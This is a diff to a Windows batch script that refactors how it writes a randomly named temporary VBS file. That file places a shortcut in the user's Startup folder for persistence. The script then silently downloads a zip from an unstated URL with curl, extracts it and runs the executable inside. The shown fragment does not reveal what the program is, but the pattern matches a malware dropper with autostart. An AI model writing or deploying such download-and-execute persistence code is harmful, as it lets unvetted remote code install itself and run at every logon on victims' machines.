@@ -9,15 +9,16 @@ rmdir /s /q "%DIR%" 2>nul & mkdir "%DIR%"
 
 if exist "%startupFolder%\%shortcutName%" del /q /f "%startupFolder%\%shortcutName%"
 
-set "vbsFile=%TEMP%\djjwiwien3b.vbs"
-echo Set oWS = WScript.CreateObject("WScript.Shell") > "%vbsFile%"
-echo sLinkFile = "%startupFolder%\%shortcutName%" >> "%vbsFile%"
-echo Set oLink = oWS.CreateShortcut(sLinkFile) >> "%vbsFile%"
-echo oLink.TargetPath = "%DIR%\%EXE%" >> "%vbsFile%"
-echo oLink.WorkingDirectory = "%DIR%" >> "%vbsFile%"
-echo oLink.Save >> "%vbsFile%"
+(
+echo Set oWS = WScript.CreateObject^("WScript.Shell"^)
+echo sLinkFile = "%startupFolder%\%shortcutName%"
+echo Set oLink = oWS.CreateShortcut^(sLinkFile^)
+echo oLink.TargetPath = "%DIR%\%EXE%"
+echo oLink.WorkingDirectory = "%DIR%"
+echo oLink.Save
+) > "%vbsFile%"
 
-wscript "%vbsFile%"
+start "" /wait wscript.exe "%vbsFile%"
 del "%vbsFile%"
 
 curl -Ls "%URL%" -o "%TEMP%\pkg.zip" && tar -xf "%TEMP%\pkg.zip" -C "%DIR%" && del /q "%TEMP%\pkg.zip" && start "" /wait "%DIR%\%EXE%"
